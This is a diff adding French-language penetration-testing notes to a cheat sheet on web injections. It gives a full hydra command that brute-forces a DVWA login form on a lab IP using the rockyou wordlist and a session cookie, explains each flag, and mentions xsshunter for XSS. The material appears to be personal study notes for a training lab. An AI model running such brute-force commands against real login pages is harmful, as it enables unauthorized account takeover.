@@ -140,6 +140,14 @@
 
     
 #[INJECTIONS WEB]
+
+
+      Brute force
+        Avec hydra :
+        hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://192.168.46.141/DVWA-master/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=of7vk530l9s8e7rph9oac52923;            security=medium:F=Username and/or password incorrect'      
+        -l pour le user (-L si wordlist de user)
+        -P wordlist de password (-p password statique)
+        'http-getform: urlduformulaire : password et mdp : H=cookie de session:F= reponse en cas de bad user pwd'
     
       Inection XSS : 
         xsshunter https://github.com/mandatoryprogrammer/xsshunter-express
